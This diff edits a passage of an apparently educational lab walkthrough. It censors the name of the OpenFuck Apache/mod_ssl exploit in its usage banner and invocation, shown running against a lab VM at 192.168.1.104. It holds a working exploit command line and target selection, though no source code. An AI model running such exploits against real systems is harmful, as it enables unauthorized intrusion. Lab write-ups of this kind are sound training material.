@@ -184,10 +184,10 @@ And yes - I did redact the words, just trying to keep it professional here folks
 Great! Now that we have our compiled exploit code, let's go ahead and run it to see its usage.
 
 ```console
-oot@kali:~# ./OpenFuck 
+root@kali:~# ./OpenF**k 
 
 *******************************************************************
-* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+* OpenF**k v3.0.32-root priv8 by SPABAM based on openssl-too-open *
 *******************************************************************
 * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
 * #hackarena  irc.brasnet.org                                     *
@@ -196,7 +196,7 @@ oot@kali:~# ./OpenFuck
 * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
 *******************************************************************
 
-: Usage: ./OpenFuck target box [port] [-c N]
+: Usage: ./OpenF**k target box [port] [-c N]
 
   target - supported box eg: 0x00
   box - hostname or IP address
@@ -209,10 +209,10 @@ Since the VM's Apache Version is 1.3.20, I will select __0x6b__ as our __target_
 Now that we know our target version, the IP, and HTTP Port - let's go ahead and run the exploit!
 
 ```console
-root@kali:~# ./OpenFuck 0x6b 192.168.1.104 443 -c 40
+root@kali:~# ./OpenF**k 0x6b 192.168.1.104 443 -c 40
 
 *******************************************************************
-* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+* OpenF**k v3.0.32-root priv8 by SPABAM based on openssl-too-open *
 *******************************************************************
 * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
 * #hackarena  irc.brasnet.org                                     *
